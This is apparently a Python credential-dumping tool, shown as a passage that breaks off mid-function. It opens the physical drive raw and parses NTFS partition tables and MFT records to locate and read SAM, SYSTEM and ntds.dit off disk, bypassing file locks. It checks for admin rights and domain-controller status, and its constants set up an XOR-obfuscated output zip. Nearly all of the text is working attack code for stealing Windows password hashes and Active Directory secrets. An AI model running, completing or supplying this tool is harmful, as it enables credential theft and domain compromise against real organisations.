import ctypes
import os
import sys
import struct
import zipfile
import io
import uuid # For GUID comparison

# --- Constants ---
DEFAULT_DISK_SECTOR_SIZE = 512
MFT_CHUNK_READ_SIZE = 1 * 1024 * 1024  # 1MB
STANDARD_MFT_RECORD_STRUCT_SIZE = 1024 # Standard size for parsing MFT record structure
SAM_SIGNATURE_CHECK_SIZE = 4  # "regf"

VERBOSE_DEBUG = False # Set to True for detailed parsing error messages and verbose logs

# Target filenames (simple names, case-insensitive search)
TARGET_SAM_FILENAME_DEFAULT = "SAM"
TARGET_NTDS_FILENAME = "ntds.dit" # Simple name for MFT search
TARGET_SYSTEM_FILENAME = "SYSTEM"

# Output settings
XOR_KEY = b"bobbert" # CHANGE THIS!
OUTPUT_ZIP_FILENAME = "hives_dump.zip"

# GUID for Basic Data Partition
# {EBD0A0A2-B9E5-4433-87C0-68B6B72699C7}
PARTITION_BASIC_DATA_GUID = uuid.UUID('{EBD0A0A2-B9E5-4433-87C0-68B6B72699C7}')

# --- Windows API Definitions ---
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
shell32 = ctypes.WinDLL('shell32', use_last_error=True) # For IsUserAnAdmin
netapi32 = ctypes.WinDLL('netapi32', use_last_error=True) # For NetServerGetInfo, NetApiBufferFree

GENERIC_READ = 0x80000000
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x00000080
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

FILE_BEGIN = 0

# For NetServerGetInfo
SV_TYPE_DOMAIN_CTRL = 0x00000008      # Primary Domain Controller
SV_TYPE_DOMAIN_BAKCTRL = 0x00000010   # Backup Domain Controller

# --- Helper Structures ---
class DataRun:
    def __init__(self, lcn, cluster_count, physical_offset_bytes, length_bytes):
        self.lcn = lcn
        self.cluster_count = cluster_count
        self.physical_offset_bytes = physical_offset_bytes
        self.length_bytes = length_bytes

    def __repr__(self):
        return f"DataRun(LCN=0x{self.lcn:X}, Clusters={self.cluster_count}, PhysOffset=0x{self.physical_offset_bytes:X}, LenBytes={self.length_bytes})"

class MftFileInfo:
    def __init__(self):
        self.record_number = 0
        self.file_name = ""
        self.is_directory = False
        self.data_attribute_found = False
        self.data_is_resident = False
        self.resident_data_physical_offset = 0
        self.resident_data_length = 0
        self.resident_data_content = b""
        self.non_resident_real_size = 0
        self.non_resident_data_runs = []
        self.name_type = 0xFF

    def __repr__(self):
        return (f"MftFileInfo(Rec={self.record_number}, Name='{self.file_name}', Dir={self.is_directory}, "
                f"DataFound={self.data_attribute_found}, Resident={self.data_is_resident}, "
                f"ResSize={self.resident_data_length}, NonResSize={self.non_resident_real_size}, "
                f"Runs={len(self.non_resident_data_runs)})")

class VBRInfo:
    def __init__(self):
        self.bytes_per_sector = DEFAULT_DISK_SECTOR_SIZE
        self.sectors_per_cluster = 0
        self.mft_start_lcn = 0
        self.clusters_per_mft_record_raw = 0
        self.allocated_bytes_per_mft_record = STANDARD_MFT_RECORD_STRUCT_SIZE
        self.partition_start_offset_bytes = 0
        self.disk_bytes_per_sector = DEFAULT_DISK_SECTOR_SIZE

    def __repr__(self):
        return (f"VBRInfo(BPS={self.bytes_per_sector}, SPC={self.sectors_per_cluster}, MFT_LCN=0x{self.mft_start_lcn:X}, "
                f"AllocMFTRecSize={self.allocated_bytes_per_mft_record}, PartOffset=0x{self.partition_start_offset_bytes:X})")

class SERVER_INFO_101(ctypes.Structure):
    _fields_ = [
        ("sv101_platform_id", ctypes.c_ulong),
        ("sv101_name", ctypes.c_wchar_p),
        ("sv101_version_major", ctypes.c_ulong),
        ("sv101_version_minor", ctypes.c_ulong),
        ("sv101_type", ctypes.c_ulong),
        ("sv101_comment", ctypes.c_wchar_p)
    ]

class LARGE_INTEGER_UNION(ctypes.Union):
    _fields_ = [("QuadPart", ctypes.c_longlong)]

class LARGE_INTEGER(ctypes.Structure):
    _anonymous_ = ("u",)
    _fields_ = [("u", LARGE_INTEGER_UNION)]

# --- Windows API Helper Functions ---
def is_admin():
    try:
        return shell32.IsUserAnAdmin() != 0
    except AttributeError: # Fallback if IsUserAnAdmin is not found
        try: # Attempt to open a resource that requires admin rights as a fallback check
            test_handle = kernel32.CreateFileW(
                ctypes.c_wchar_p(r"\\.\PhysicalDrive0"), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, None
            )
            if test_handle != INVALID_HANDLE_VALUE:
                kernel32.CloseHandle(test_handle)
                return True
        except Exception:
            pass
        return False

def is_domain_controller():
    bufptr = ctypes.POINTER(SERVER_INFO_101)()
    status = netapi32.NetServerGetInfo(None, 101, ctypes.byref(bufptr))
    if status != 0: # NERR_Success == 0
        if VERBOSE_DEBUG: print(f"[-] NetServerGetInfo failed with status: {status}")
        return False
    
    is_dc_flag = False
    try:
        server_type = bufptr.contents.sv101_type
        if (server_type & SV_TYPE_DOMAIN_CTRL) or (server_type & SV_TYPE_DOMAIN_BAKCTRL):
            is_dc_flag = True
    finally:
        if bufptr: # Check if bufptr is not NULL before freeing
            netapi32.NetApiBufferFree(bufptr)
    return is_dc_flag

def open_physical_drive(drive_index=0):
    drive_path = f"\\\\.\\PhysicalDrive{drive_index}"
    print(f"[*] Attempting to open: {drive_path}")
    handle = kernel32.CreateFileW(
        ctypes.c_wchar_p(drive_path), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, None
    )
    if handle == INVALID_HANDLE_VALUE:
        error_code = kernel32.GetLastError()
        print(f"[-] Failed to open {drive_path}. Error code: {error_code}. Ensure script is run as Administrator.")
        return None
    print(f"[+] Successfully opened {drive_path} with handle {handle:X}")
    return handle

def close_physical_drive(handle):
    if handle and handle != INVALID_HANDLE_VALUE:
        kernel32.CloseHandle(handle)
        print("[+] Physical drive handle closed.")

def read_from_offset(drive_handle, offset_bytes, size_to_read):
    if not drive_handle or drive_handle == INVALID_HANDLE_VALUE: return None

    offset_li = LARGE_INTEGER()
    offset_li.u.QuadPart = offset_bytes
    new_pos_li = LARGE_INTEGER() 

    if not kernel32.SetFilePointerEx(drive_handle, offset_li.u, ctypes.byref(new_pos_li.u), FILE_BEGIN):
        if VERBOSE_DEBUG: print(f"[-] SetFilePointerEx failed for offset 0x{offset_bytes:X}. Error: {kernel32.GetLastError()}")
        return None

    buffer = ctypes.create_string_buffer(size_to_read)
    bytes_read_val = ctypes.c_ulong(0)

    if not kernel32.ReadFile(drive_handle, buffer, size_to_read, ctypes.byref(bytes_read_val), None):
        if VERBOSE_DEBUG: print(f"[-] ReadFile failed at offset 0x{offset_bytes:X} for {size_to_read} bytes. Error: {kernel32.GetLastError()}")
        return None
    
    return buffer.raw[:bytes_read_val.value]

# --- NTFS Parsing Logic ---
def verify_and_select_ntfs_partition(drive_handle, potential_partition_lba, disk_bytes_per_sector):
    partition_offset_bytes = potential_partition_lba * disk_bytes_per_sector
    vbr_data = read_from_offset(drive_handle, partition_offset_bytes, disk_bytes_per_sector)

    if not vbr_data or len(vbr_data) < disk_bytes_per_sector:
        if VERBOSE_DEBUG: print(f"[D] Failed to read potential VBR for LBA {potential_partition_lba}")
        return None, None

    try:
        oem_id_bytes = vbr_data[3:11]
        oem_id = oem_id_bytes.decode('ascii', errors='ignore').strip()
        
        if oem_id == "-FVE-FS-":
            print(f"[!] Partition at LBA {potential_partition_lba} appears to be BitLocker encrypted (OEM: {oem_id}). Skipping.")
            return None, None

        mft_start_lcn = struct.unpack_from("<Q", vbr_data, 0x30)[0] # Offset 48
        vbr_bps = struct.unpack_from("<H", vbr_data, 0x0B)[0]       # Offset 11
        vbr_sig = struct.unpack_from("<H", vbr_data, disk_bytes_per_sector - 2)[0]

        if VERBOSE_DEBUG: print(f"[D] Potential VBR LBA {potential_partition_lba}: OEM='{oem_id}', MFT_LCN=0x{mft_start_lcn:X}, VBR_BPS={vbr_bps}, Sig=0x{vbr_sig:X}")

        if oem_id == "NTFS" and 0 < mft_start_lcn < 0x100000000: # Reasonable MFT LCN
            final_bps = vbr_bps if vbr_bps else disk_bytes_per_sector
            if vbr_sig == 0xAA55:
                return partition_offset_bytes, final_bps
            else: # Allow if signature is off but other indicators are good (as per C++ PoC)
                if VERBOSE_DEBUG: print(f"[D] NTFS OEM ID and MFT LCN OK, but VBR signature 0x{vbr_sig:X} is not 0xAA55. Considering valid.")
                return partition_offset_bytes, final_bps
    except struct.error as e:
        if VERBOSE_DEBUG: print(f"[D] Struct unpack error for VBR at LBA {potential_partition_lba}: {e}")
    except Exception as e: # Catch any other unexpected error during parsing
        if VERBOSE_DEBUG: print(f"[D] General error parsing VBR at LBA {potential_partition_lba}: {e}")
    return None, None

def get_ntfs_partition_info(drive_handle):
    print("[*] Reading MBR (Sector 0)...")
    mbr_data = read_from_offset(drive_handle, 0, DEFAULT_DISK_SECTOR_SIZE)
    if not mbr_data or len(mbr_data) < DEFAULT_DISK_SECTOR_SIZE:
        print("[-] Failed to read MBR.")
        return None

    if struct.unpack_from("<H", mbr_data, 510)[0] != 0xAA55: # MBR Signature
        if VERBOSE_DEBUG: print(f"[-] Invalid MBR signature: 0x{struct.unpack_from('<H', mbr_data, 510)[0]:X}")

    found_gpt_protective = False
    for i in range(4): # Iterate MBR partition entries
        entry_offset = 446 + (i * 16)
        if entry_offset + 16 > len(mbr_data): break # Boundary check

        part_type = mbr_data[entry_offset + 4]
        start_lba = struct.unpack_from("<I", mbr_data, entry_offset + 8)[0]
        if VERBOSE_DEBUG: print(f"[D] MBR Partition {i}: Type=0x{part_type:02X}, StartLBA={start_lba}")

        if part_type == 0xEE: # GPT Protective MBR
            found_gpt_protective = True
            if VERBOSE_DEBUG: print("[D] Found GPT Protective MBR entry.")
            break
        if part_type == 0x07 and start_lba > 0: # NTFS
            if VERBOSE_DEBUG: print(f"[D] Found MBR NTFS-like partition (0x07) at LBA {start_lba}. Verifying...")
            part_offset_bytes, vbr_bps = verify_and_select_ntfs_partition(drive_handle, start_lba, DEFAULT_DISK_SECTOR_SIZE)
            if part_offset_bytes is not None:
                vbr_info = VBRInfo()
                vbr_info.partition_start_offset_bytes = part_offset_bytes
                vbr_info.bytes_per_sector = vbr_bps # This is VBR's BPS, or disk default if VBR's is 0
                print(f"[+] Selected NTFS partition from MBR at LBA {start_lba}, Offset 0x{part_offset_bytes:X}")
                return vbr_info

    if found_gpt_protective:
        print("[*] GPT Protective MBR found. Parsing GPT Header (LBA 1)...")
        gpt_header_data = read_from_offset(drive_handle, 1 * DEFAULT_DISK_SECTOR_SIZE, DEFAULT_DISK_SECTOR_SIZE)
        if not gpt_header_data or len(gpt_header_data) < 92: # Min GPT header size
            print("[-] Failed to read GPT Header.")
            return None

        if struct.unpack_from("<Q", gpt_header_data, 0)[0] != 0x5452415020494645: # "EFI PART"
            if VERBOSE_DEBUG: print(f"[-] Invalid GPT Header signature: 0x{struct.unpack_from('<Q', gpt_header_data, 0)[0]:X}")
            return None
        if VERBOSE_DEBUG: print("[D] GPT Header signature OK.")

        part_entry_lba = struct.unpack_from("<Q", gpt_header_data, 72)[0]
        num_part_entries = struct.unpack_from("<I", gpt_header_data, 80)[0]
        size_part_entry = struct.unpack_from("<I", gpt_header_data, 84)[0]
        if VERBOSE_DEBUG: print(f"[D] GPT: PartEntryLBA={part_entry_lba}, NumEntries={num_part_entries}, EntrySize={size_part_entry}")

        if not (part_entry_lba > 0 and num_part_entries > 0 and size_part_entry > 0 and size_part_entry >= 128): # GPT entry min size
            print("[-] Invalid GPT partition entry parameters.")
            return None

        max_entries_to_scan = min(num_part_entries, 256) # Cap scanning
        gpt_entries_data_size = max_entries_to_scan * size_part_entry
        if gpt_entries_data_size > 4 * 1024 * 1024: # Cap read size
             if VERBOSE_DEBUG: print(f"[!] GPT partition array size {gpt_entries_data_size} too large, capping read.")
             gpt_entries_data_size = 4 * 1024 * 1024
             max_entries_to_scan = gpt_entries_data_size // size_part_entry


        gpt_entries_data = read_from_offset(drive_handle, part_entry_lba * DEFAULT_DISK_SECTOR_SIZE, gpt_entries_data_size)
        if not gpt_entries_data:
            print("[-] Failed to read GPT partition entries.")
            return None

        for i in range(max_entries_to_scan):
            entry_offset_in_buffer = i * size_part_entry
            if entry_offset_in_buffer + size_part_entry > len(gpt_entries_data):
                if VERBOSE_DEBUG: print(f"[D] Reached end of readable GPT entries buffer at index {i}")
                break

            type_guid_bytes = gpt_entries_data[entry_offset_in_buffer : entry_offset_in_buffer + 16]
            first_lba = struct.unpack_from("<Q", gpt_entries_data, entry_offset_in_buffer + 32)[0]
            if first_lba == 0: continue # Skip empty entries

            current_guid = uuid.UUID(bytes_le=type_guid_bytes)
            if current_guid == PARTITION_BASIC_DATA_GUID: # Basic Data Partition
                if VERBOSE_DEBUG: print(f"[D] Found GPT Basic Data Partition at LBA {first_lba}. Verifying...")
                part_offset_bytes, vbr_bps = verify_and_select_ntfs_partition(drive_handle, first_lba, DEFAULT_DISK_SECTOR_SIZE)
                if part_offset_bytes is not None:
                    vbr_info = VBRInfo()
                    vbr_info.partition_start_offset_bytes = part_offset_bytes
                    vbr_info.bytes_per_sector = vbr_bps
                    print(f"[+] Selected NTFS partition from GPT at LBA {first_lba}, Offset 0x{part_offset_bytes:X}")
                    return vbr_info
    
    print("[-] No suitable NTFS partition found.")
    return None

def parse_full_vbr_info(drive_handle, vbr_info_stub):
    if not vbr_info_stub or vbr_info_stub.partition_start_offset_bytes is None: return None

    vbr_data = read_from_offset(drive_handle, vbr_info_stub.partition_start_offset_bytes, vbr_info_stub.bytes_per_sector)
    if not vbr_data or len(vbr_data) < vbr_info_stub.bytes_per_sector:
        print(f"[-] Failed to read full VBR at offset 0x{vbr_info_stub.partition_start_offset_bytes:X}")
        return None

    try:
        # VBR BytesPerSector is already set in vbr_info_stub from verify_and_select_ntfs_partition
        vbr_info_stub.sectors_per_cluster = vbr_data[0x0D] # Offset 13, BYTE
        vbr_info_stub.mft_start_lcn = struct.unpack_from("<Q", vbr_data, 0x30)[0] # Offset 48, ULONGLONG
        vbr_info_stub.clusters_per_mft_record_raw = struct.unpack_from("<b", vbr_data, 0x40)[0] # Offset 64, SIGNED char

        if vbr_info_stub.bytes_per_sector == 0:
            if VERBOSE_DEBUG: print("[!] VBR BytesPerSector is zero. Using disk's default.")
            vbr_info_stub.bytes_per_sector = vbr_info_stub.disk_bytes_per_sector # Fallback
        if vbr_info_stub.sectors_per_cluster == 0:
            if VERBOSE_DEBUG: print("[!] VBR SectorsPerCluster is zero. Assuming 8.")
            vbr_info_stub.sectors_per_cluster = 8 # Common default

        # Calculate allocated_bytes_per_mft_record
        raw_val = vbr_info_stub.clusters_per_mft_record_raw
        if raw_val > 0: # Value is Clusters per MFT Record
            vbr_info_stub.allocated_bytes_per_mft_record = raw_val * \
                vbr_info_stub.sectors_per_cluster * vbr_info_stub.bytes_per_sector
        elif raw_val < 0: # Value is 2^abs(value) bytes
            vbr_info_stub.allocated_bytes_per_mft_record = 1 << abs(raw_val)
        else: # Is 0, default to standard size
            vbr_info_stub.allocated_bytes_per_mft_record = STANDARD_MFT_RECORD_STRUCT_SIZE
            if VERBOSE_DEBUG: print("[!] VBR ClustersPerMftRecord is zero, defaulting MFT allocated record size to 1024.")
        
        print(f"[+] VBR Parsed: BPS={vbr_info_stub.bytes_per_sector}, SPC={vbr_info_stub.sectors_per_cluster}, "
              f"MFT_LCN=0x{vbr_info_stub.mft_start_lcn:X}, "
              f"AllocMFTRecSize={vbr_info_stub.allocated_bytes_per_mft_record}")
        
        # target_filename_simple is not defined in this scope, this check was problematic.
        # If mft_start_lcn is 0, it's usually for the $MFT itself.
        # Other files having MFT LCN 0 would be highly unusual.
        if vbr_info_stub.mft_start_lcn == 0 and VERBOSE_DEBUG:
             print("[D] MFT Start LCN from VBR is zero (expected for $MFT itself).")
        return vbr_info_stub
    except struct.error as e:
        if VERBOSE_DEBUG: print(f"[-] Error parsing VBR fields: {e}")
    return None

def parse_data_runs(entire_attribute_bytes, non_res_specific_header_start_offset, vbr_info):
    runs = []
    real_size = 0
    
    # Offsets relative to the start of the non-resident specific header part
    DATA_RUN_OFFSET_FIELD_IN_NON_RES_HDR = 16 # WORD
    REAL_SIZE_FIELD_IN_NON_RES_HDR = 32       # ULONGLONG

    # Absolute offsets from the start of entire_attribute_bytes
    abs_offset_DataRunOffset_val = non_res_specific_header_start_offset + DATA_RUN_OFFSET_FIELD_IN_NON_RES_HDR
    abs_offset_RealSize_val = non_res_specific_header_start_offset + REAL_SIZE_FIELD_IN_NON_RES_HDR

    # Check if attribute is long enough to contain these fields
    if len(entire_attribute_bytes) < abs_offset_DataRunOffset_val + 2: # Need 2 bytes for DataRunOffset
        if VERBOSE_DEBUG: print(f"[-] Attr too short for DataRunOffset field. Len: {len(entire_attribute_bytes)}, Need: {abs_offset_DataRunOffset_val + 2}")
        return [], 0
    
    try:
        data_run_list_start_in_attr = struct.unpack_from("<H", entire_attribute_bytes, abs_offset_DataRunOffset_val)[0]
        if len(entire_attribute_bytes) >= abs_offset_RealSize_val + 8: # Check for RealSize
            real_size = struct.unpack_from("<Q", entire_attribute_bytes, abs_offset_RealSize_val)[0]
        else: # Cannot read RealSize, default to 0, but proceed if DataRunOffset was readable
            if VERBOSE_DEBUG: print(f"[-] Attr too short for RealSize field. Len: {len(entire_attribute_bytes)}, Need: {abs_offset_RealSize_val + 8}")
    except struct.error as e:
        if VERBOSE_DEBUG: print(f"[-] Struct error reading NonResHeader fields: {e}")
        return [], 0
            
    # data_run_list_start_in_attr is offset from start of entire_attribute_bytes to the first run byte
    if data_run_list_start_in_attr >= len(entire_attribute_bytes):
        if VERBOSE_DEBUG: print(f"[-] Data run list start (0x{data_run_list_start_in_attr:X}) is outside attribute (len 0x{len(entire_attribute_bytes):X}).")
        return [], real_size # Return real_size if parsed, runs will be empty

    # Min valid offset for data_run_list_start_in_attr (must be after the DataRunOffset field itself)
    min_valid_run_start = non_res_specific_header_start_offset + DATA_RUN_OFFSET_FIELD_IN_NON_RES_HDR + 2
    if data_run_list_start_in_attr < min_valid_run_start:
        if VERBOSE_DEBUG: print(f"[-] Data run list start (0x{data_run_list_start_in_attr:X}) points within non-resident header (min valid 0x{min_valid_run_start:X}).")
        return [], real_size
        
    current_run_ptr = data_run_list_start_in_attr # Index into entire_attribute_bytes
    current_accumulated_lcn = 0
    bytes_per_cluster = vbr_info.bytes_per_sector * vbr_info.sectors_per_cluster

    while current_run_ptr < len(entire_attribute_bytes):
        run_header = entire_attribute_bytes[current_run_ptr]
        if run_header == 0x00: break # End of data runs
        
        current_run_ptr += 1
        if current_run_ptr >= len(entire_attribute_bytes): # Boundary check after increment
            if VERBOSE_DEBUG: print("[-] Data run parsing: ran off end after reading run header.")
            break 

        length_field_size = run_header & 0x0F
        offset_field_size = (run_header >> 4) & 0x0F

        if current_run_ptr + length_field_size + offset_field_size > len(entire_attribute_bytes):
            if VERBOSE_DEBUG: print(f"[-] Data run parsing: offset out of bounds for len/off fields. AttrLen:{len(entire_attribute_bytes)}, CurPtr:{current_run_ptr}, LenSize:{length_field_size}, OffSize:{offset_field_size}")
            return runs, real_size # Return what's parsed so far

        run_length_clusters = 0
        if length_field_size > 0:
            len_bytes = entire_attribute_bytes[current_run_ptr : current_run_ptr + length_field_size]
            run_length_clusters = int.from_bytes(len_bytes, byteorder='little', signed=False)
        current_run_ptr += length_field_size

        run_offset_lcn_delta = 0
        if offset_field_size > 0:
            off_bytes = entire_attribute_bytes[current_run_ptr : current_run_ptr + offset_field_size]
            run_offset_lcn_delta = int.from_bytes(off_bytes, byteorder='little', signed=True) # Offset is signed
        current_run_ptr += offset_field_size

        current_accumulated_lcn += run_offset_lcn_delta

        if run_length_clusters > 0:
            run_length_bytes = run_length_clusters * bytes_per_cluster
            run_physical_offset_bytes = vbr_info.partition_start_offset_bytes + (current_accumulated_lcn * bytes_per_cluster)
            runs.append(DataRun(current_accumulated_lcn, run_length_clusters, run_physical_offset_bytes, run_length_bytes))
            
    return runs, real_size

def parse_mft_record_for_file_info(record_data, record_start_offset_on_disk, vbr_info, target_filename_simple):
    if len(record_data) < STANDARD_MFT_RECORD_STRUCT_SIZE: return None
    
    try:
        if record_data[0:4] != b'FILE': return None # Signature "FILE"
        if not (struct.unpack_from("<H", record_data, 22)[0] & 0x0001): return None # InUse flag

        mft_info = MftFileInfo()
        mft_info.record_number = struct.unpack_from("<I", record_data, 44)[0] # MftRecordNumber
        mft_info.is_directory = bool(struct.unpack_from("<H", record_data, 22)[0] & 0x0002) # IsDirectory flag
        
        attr_offset = struct.unpack_from("<H", record_data, 20)[0] # AttributeOffset
        record_bytes_in_use = struct.unpack_from("<I", record_data, 24)[0] # BytesInUse
        # Effective length of record data to parse for attributes
        parse_limit = min(len(record_data), record_bytes_in_use, vbr_info.allocated_bytes_per_mft_record)
        
        found_filename_attr_match = False

        while attr_offset < parse_limit:
            # Min size for an attribute header (Type + Length + NonResidentFlag + NameLength + NameOffset + Flags + AttributeId)
            if attr_offset + 16 > parse_limit: break 
            
            attr_type = struct.unpack_from("<I", record_data, attr_offset)[0]
            attr_len = struct.unpack_from("<I", record_data, attr_offset + 4)[0]

            if attr_type == 0xFFFFFFFF or attr_len == 0: break # End of attributes marker or invalid length
            if attr_offset + attr_len > parse_limit: # Attribute claims to be longer than record space
                if VERBOSE_DEBUG: print(f"[D] MFT Rec {mft_info.record_number}: Attr type 0x{attr_type:X} length {attr_len} exceeds record parse limit {parse_limit}.")
                break 

            non_res_flag = record_data[attr_offset + 8] # NonResidentFlag (BYTE)
            name_len = record_data[attr_offset + 9]     # NameLength (BYTE)
            # name_offset_in_attr = struct.unpack_from("<H", record_data, attr_offset + 10)[0] # NameOffset

            # Slice of the current attribute's full data
            current_attribute_data = record_data[attr_offset : attr_offset + attr_len]

            if attr_type == 0x30:  # $FILE_NAME attribute
                if non_res_flag == 0: # Must be resident
                    try:
                        # Resident Attribute Header starts after common part (16 bytes for unnamed)
                        # For $FILE_NAME, it's always unnamed.
                        val_len = struct.unpack_from("<I", current_attribute_data, 16)[0] # ValueLength
                        val_off = struct.unpack_from("<H", current_attribute_data, 20)[0] # ValueOffset
                        
                        # FILE_NAME_ATTRIBUTE structure starts at current_attribute_data[val_off]
                        # NameLength (BYTE) is at offset 0x40 (64) within FILE_NAME_ATTRIBUTE struct
                        # NameType (BYTE) is at offset 0x41 (65)
                        # Name (WCHAR[]) is at offset 0x42 (66)
                        fn_struct_name_len_offset = val_off + 64
                        fn_struct_name_type_offset = val_off + 65
                        fn_struct_name_start_offset = val_off + 66

                        if fn_struct_name_start_offset < len(current_attribute_data): # Basic check
                            chars_in_name = current_attribute_data[fn_struct_name_len_offset]
                            name_type_val = current_attribute_data[fn_struct_name_type_offset]
                            
                            name_bytes_len = chars_in_name * 2 # WCHAR
                            if fn_struct_name_start_offset + name_bytes_len <= len(current_attribute_data) and \
                               fn_struct_name_start_offset + name_bytes_len <= val_off + val_len : # Check against ValueLength
                                name_bytes_arr = current_attribute_data[fn_struct_name_start_offset : fn_struct_name_start_offset + name_bytes_len]
                                parsed_filename = name_bytes_arr.decode('utf-16le', errors='ignore')

                                if parsed_filename.lower() == target_filename_simple.lower():
                                    # Prefer Win32 names (type 1 or 3)
                                    if (mft_info.name_type == 0xFF or \
                                        ((name_type_val == 1 or name_type_val == 3) and mft_info.name_type == 2) or \
                                        (name_type_val == 1 and mft_info.name_type not in [1,3]) or \
                                        (name_type_val == 3 and mft_info.name_type != 3) ):
                                        mft_info.file_name = parsed_filename
                                        mft_info.name_type = name_type_val
                                    found_filename_attr_match = True
                    except struct.error:
                        if VERBOSE_DEBUG: print(f"[D] MFT Rec {mft_info.record_number}: Struct error parsing $FILE_NAME.")
                    except IndexError:
                        if VERBOSE_DEBUG: print(f"[D] MFT Rec {mft_info.record_number}: Index error parsing $FILE_NAME details.")


            elif attr_type == 0x80 and name_len == 0:  # $DATA attribute (unnamed)
                mft_info.data_attribute_found = True
                mft_info.data_is_resident = (non_res_flag == 0)
                
                # Common attribute header part for unnamed attribute is 16 bytes.
                COMMON_ATTR_HEADER_SIZE = 16

                if mft_info.data_is_resident:
                    try:
                        # Resident Attribute Header starts after common part
                        val_len = struct.unpack_from("<I", current_attribute_data, COMMON_ATTR_HEADER_SIZE + 0)[0] # ValueLength
                        val_off = struct.unpack_from("<H", current_attribute_data, COMMON_ATTR_HEADER_SIZE + 4)[0] # ValueOffset
                        
                        mft_info.resident_data_length = val_len
                        mft_info.non_resident_real_size = val_len # For resident, real size is value length
                        mft_info.resident_data_physical_offset = record_start_offset_on_disk + attr_offset + val_off
                        
                        # Pre-fetch small resident data (as in C++ logic)
                        if 0 < val_len <= 2048 and target_filename_simple.upper() != "$MFT":
                             if val_off + val_len <= len(current_attribute_data):
                                mft_info.resident_data_content = current_attribute_data[val_off : val_off + val_len]
                             else: # Should not happen if attr_len is correct
                                mft_info.resident_data_length = 0 
                                if VERBOSE_DEBUG: print(f"[D] MFT Rec {mft_info.record_number}: Resident $DATA value extends beyond attribute length.")
                    except struct.error:
                        mft_info.resident_data_length = 0
                        if VERBOSE_DEBUG: print(f"[D] MFT Rec {mft_info.record_number}: Struct error parsing resident $DATA.")
                else: # Non-resident $DATA
                    # The NonResident-specific header part starts after the common attribute header.
                    offset_of_non_res_hdr_in_attr = COMMON_ATTR_HEADER_SIZE
                    runs, real_size = parse_data_runs(current_attribute_data, offset_of_non_res_hdr_in_attr, vbr_info)
                    mft_info.non_resident_data_runs = runs
                    mft_info.non_resident_real_size = real_size
            
            attr_offset += attr_len
            if attr_offset % 8 != 0: # Align to 8-byte boundary
                attr_offset = (attr_offset + 7) & ~7
        
        if found_filename_attr_match and mft_info.data_attribute_found:
            if target_filename_simple.lower() == TARGET_NTDS_FILENAME.lower():
                 if not mft_info.is_directory: return mft_info
            elif target_filename_simple.upper() == "SAM":
                if not mft_info.is_directory: return mft_info
            elif target_filename_simple.upper() == "$MFT":
                 if mft_info.record_number == 0: return mft_info
            else: # For SYSTEM or other files
                if not mft_info.is_directory: return mft_info
    except struct.error:
        if VERBOSE_DEBUG: print(f"[D] MFT Rec {mft_info.record_number if 'mft_info' in locals() else 'N/A'}: Top-level struct error.")
    except Exception as e:
        if VERBOSE_DEBUG: print(f"[D] MFT Rec {mft_info.record_number if 'mft_info' in locals() else 'N/A'}: General error: {e}")
    return None

def read_file_content_from_disk(drive_handle, mft_file_info, vbr_info):
    if not mft_file_info or not mft_file_info.data_attribute_found: return None

    if mft_file_info.data_is_resident:
        if mft_file_info.resident_data_length > 0:
            if mft_file_info.resident_data_content: # If pre-fetched
                return mft_file_info.resident_data_content
            elif mft_file_info.resident_data_physical_offset > 0:
                return read_from_offset(drive_handle, 
                                        mft_file_info.resident_data_physical_offset, 
                                        mft_file_info.resident_data_length)
            else:
                 if VERBOSE_DEBUG: print(f"[!] Resident data for {mft_file_info.file_name} has zero physical offset.")
                 return None
        return b"" # Zero length resident data
    else: # Non-resident
        effective_real_size = mft_file_info.non_resident_real_size
        if not mft_file_info.non_resident_data_runs and effective_real_size > 0:
            if VERBOSE_DEBUG: print(f"[!] Non-resident file {mft_file_info.file_name} has size {effective_real_size} but no data runs.")
            return None
        if effective_real_size == 0: # Can be zero-byte file or fully sparse uninitialized
             return b""

        file_content_bytes = bytearray()
        total_bytes_read_from_runs = 0
        for run in mft_file_info.non_resident_data_runs:
            if total_bytes_read_from_runs >= effective_real_size: break
            if run.cluster_count == 0 or run.length_bytes == 0: continue

            bytes_to_read_this_run = run.length_bytes
            if total_bytes_read_from_runs + bytes_to_read_this_run > effective_real_size:
                bytes_to_read_this_run = effective_real_size - total_bytes_read_from_runs
            if bytes_to_read_this_run == 0 : continue

            current_offset_in_run_data = 0
            while current_offset_in_run_data < bytes_to_read_this_run:
                chunk_size = min(MFT_CHUNK_READ_SIZE, bytes_to_read_this_run - current_offset_in_run_data)
                if chunk_size == 0: break
                
                data_chunk = read_from_offset(drive_handle, 
                                              run.physical_offset_bytes + current_offset_in_run_data,
                                              chunk_size)
                if not data_chunk:
                    if VERBOSE_DEBUG: print(f"[-] Error reading data run chunk for {mft_file_info.file_name}")
                    return None # Abort on read error
                
                file_content_bytes.extend(data_chunk)
                total_bytes_read_from_runs += len(data_chunk)
                current_offset_in_run_data += len(data_chunk)
                if len(data_chunk) < chunk_size: break # Partial read from chunk
            if total_bytes_read_from_runs >= effective_real_size: break
        
        return bytes(file_content_bytes[:effective_real_size]) # Ensure not to exceed real_size
    return b"" # Should not be reached if logic is correct

def find_target_file_in_mft(drive_handle, vbr_info, mft_data_runs, mft_total_size_bytes, target_filename_simple):
    if not mft_data_runs:
        print(f"[!] $MFT data runs not available or empty. Cannot scan MFT for '{target_filename_simple}'.")
        return None

    print(f"[*] Scanning MFT for '{target_filename_simple}' using $MFT data runs ({len(mft_data_runs)} runs, total size {mft_total_size_bytes} bytes)...")
    
    for run_index, mft_run in enumerate(mft_data_runs):
        if VERBOSE_DEBUG:
            print(f"[D] Processing $MFT Data Run {run_index+1}/{len(mft_data_runs)}: Offset=0x{mft_run.physical_offset_bytes:X}, Length=0x{mft_run.length_bytes:X}")
        
        current_offset_in_run = 0
        while current_offset_in_run < mft_run.length_bytes:
            # Absolute disk offset for the start of the current MFT data chunk
            current_mft_chunk_disk_offset = mft_run.physical_offset_bytes + current_offset_in_run
            # How much to read in this sub-chunk from the current MFT run
            bytes_to_read_sub_chunk = min(MFT_CHUNK_READ_SIZE, mft_run.length_bytes - current_offset_in_run)
            if bytes_to_read_sub_chunk == 0: break
            
